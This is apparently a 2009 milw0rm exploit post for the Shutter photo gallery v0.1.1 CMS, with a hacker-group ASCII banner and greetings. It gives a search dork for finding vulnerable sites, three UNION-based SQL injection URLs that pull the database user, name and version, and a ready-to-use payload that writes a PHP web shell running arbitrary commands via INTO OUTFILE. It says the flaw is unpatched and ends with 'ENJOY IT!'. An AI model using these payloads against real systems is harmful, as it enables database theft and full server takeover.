@@ -1,0 +1,134 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	     MULTIPLE SQL INJECTION VULNERABILITIES	             	     |
+|--------------------------------------------------------------------------------------------|
+|                         | Shutter photo gallery software v-0.1.1  |		 	     |
+|  CMS INFORMATION:	   -----------------------------------------	                     |
+|										             |
+|-->WEB: http://shutter.tenfourzero.net/			         		     |
+|-->DOWNLOAD: http://shutter.tenfourzero.net/		                  		     |
+|-->DEMO: http://shutter.tenfourzero.net/video.html					     |
+|-->CATEGORY: CMS / Image Galleries							     |
+|-->DESCRIPTION: Shutter is a web package allowing users to share their photos through       |
+|		an unlimited number of albums through an easy to use administration area...  |
+|-->RELEASED: 2009-05-13								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: "powered by shutter v0.1.1"						             |
+|-->CATEGORY: SQL INJECTION							             |
+|-->AFFECT VERSION: CURRENT						 		     |
+|-->Discovered Bug date: 2009-05-13							     |
+|-->Reported Bug date: 2009-05-13							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=ON/OFF +++++++++++++++++--------->>>>
+
+
+-------
+INTRO:
+-------
+
+
+Database doesn't store information about users (or admin). 
+
+This system is completely vulnerable to sql code injection.
+
+
+-------------------
+PROOFS OF CONCEPT:
+-------------------
+
+
+GET var --> 'albumID'
+
+
+PoC-1: http://[HOST]/[PATH]/?albumID=-1+UNION+ALL+SELECT+database(),user()%23
+
+
+GET var --> 'tagID'
+
+
+PoC-2: http://[HOST]/[PATH]/?tagID=-1+UNION+ALL+SELECT+concat(user(),0x3A3A3A,database())%23
+
+
+GET var --> 'photoID'
+
+
+PoC-3: http://[HOST]/[PATH]/?photoID=-1+UNION+ALL+SELECT+concat(user(),0x3A3A3A,version()),2%23
+
+
+
+Return --> user and database in DB
+
+
+-------------------------
+EXPLOIT (SHELL UPLOAD):
+-------------------------
+
+
+<<<<---------++++++++++++++ Condition: Permission to create files +++++++++++++++++--------->>>>
+
+
+Configure --> [COMPLETE-PATH]
+
+
+http://[HOST]/[PATH]/?albumID=-1+UNION+ALL+SELECT+'<HTML><title>SHUTTER v0.1.1--SHELL BY --Y3NH4CK3R--></title><body text=ffffff bgcolor=000000><center><h1>YOUR SHELL IS ON!<br></h1></center><br><br><font color=ff0000><h2>Get var (cmd) to execute comands. Enjoy it!</h2></font><h3>Command Result:</h3><?php system($_GET[cmd]); ?>','<br><br><font color=ff0000><h3>By y3nh4ck3r. Contact: y3nh4ck3r@gmail.com</h3></font></body></HTML>'+INTO+OUTFILE+'[COMPLETE-PATH]/shell.php'%23
+
+
+Return: Your shell in --> http://[HOST]/[PATH]/shell.php
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-14]
